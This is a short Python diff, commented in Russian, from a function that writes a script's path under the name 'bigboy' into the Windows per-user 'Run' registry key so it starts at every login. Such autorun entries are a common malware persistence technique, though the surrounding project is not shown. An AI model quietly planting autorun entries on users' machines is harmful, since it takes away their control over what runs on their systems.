@@ -11,7 +11,7 @@ def AddToRegistry(filename):  # добавление в реестр
     # Путь в реестре
     autorun = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                       KEY_ALL_ACCESS)
-    SetValueEx(autorun, 'bigboy', 0, REG_SZ, application)  # Добавить скрипт в автозагрузку
+    SetValueEx(autorun, 'bigboy', 0, REG_SZ, filename)  # Добавить скрипт в автозагрузку
     CloseKey(autorun)  # Закрыть реестр
 
 
